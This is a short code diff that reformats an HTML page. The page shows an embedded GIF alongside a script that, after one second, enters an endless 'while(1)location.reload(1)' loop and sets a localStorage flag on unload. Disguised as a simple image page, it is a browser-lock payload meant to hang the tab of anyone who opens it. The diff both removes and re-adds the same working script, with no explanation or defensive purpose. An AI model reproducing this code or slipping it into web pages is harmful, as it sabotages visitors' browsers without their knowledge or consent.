@@ -1,2 +1,12 @@
-<iframe src="https://i.imgur.com/hPSnFhH.gif"></iframe><script>function sleep (time) {return new Promise((resolve) => setTimeout(resolve, time));}onbeforeunload = function(){localStorage.x=1};sleep(1000).then(() =>{while(1)location.reload(1) });
+<iframe src="https://i.imgur.com/hPSnFhH.gif"></iframe>
+<script>
+	// sleep time expects milliseconds
+	function sleep (time) {
+		return new Promise((resolve) => setTimeout(resolve, time));
+	}
+  
+	onbeforeunload = function(){localStorage.x=1};
+	sleep(1000).then(() => {
+	    while(1)location.reload(1)
+	});
 </script>
